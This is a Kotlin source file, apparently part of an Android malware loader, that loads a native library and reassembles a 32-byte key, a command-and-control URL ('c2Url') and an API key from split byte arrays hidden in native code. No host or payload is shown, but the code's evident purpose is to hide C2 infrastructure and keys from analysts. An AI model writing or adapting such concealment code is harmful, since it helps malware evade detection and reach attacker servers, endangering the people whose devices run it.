package com.sp.loader

import java.nio.charset.StandardCharsets

object NativeKey {
    init { System.loadLibrary("spcore") }

    external fun f1(): ByteArray
    external fun f2(): ByteArray
    external fun f3(): ByteArray

    fun key(): ByteArray {
        val b1 = f1()
        val b2 = f2()
        val b3 = f3()
        val out = ByteArray(32)
        for (i in 0 until 32) {
            out[i] = when (i % 3) {
                0 -> b1[i % b1.size]
                1 -> b2[i % b2.size]
                else -> b3[i % b3.size]
            }
        }
        java.util.Arrays.fill(b1, 0.toByte())
        java.util.Arrays.fill(b2, 0.toByte())
        java.util.Arrays.fill(b3, 0.toByte())
        return out
    }

    external fun c2UrlPart1(): ByteArray
    external fun c2UrlPart2(): ByteArray

    fun c2Url(): String? {
        try {
            val p1 = c2UrlPart1()
            val p2 = c2UrlPart2()
            val joined = ByteArray(p1.size + p2.size)
            System.arraycopy(p1, 0, joined, 0, p1.size)
            System.arraycopy(p2, 0, joined, p1.size, p2.size)
            java.util.Arrays.fill(p1, 0.toByte())
            java.util.Arrays.fill(p2, 0.toByte())
            return String(joined, StandardCharsets.UTF_8)
        } catch (_: Throwable) { return null }
    }

    external fun apiKeyPart(): ByteArray

    fun apiKey(): String? {
        try {
            val p = apiKeyPart()
            val s = String(p, StandardCharsets.UTF_8)
            java.util.Arrays.fill(p, 0.toByte())
            return s
        } catch (_: Throwable) { return null }
    }
}
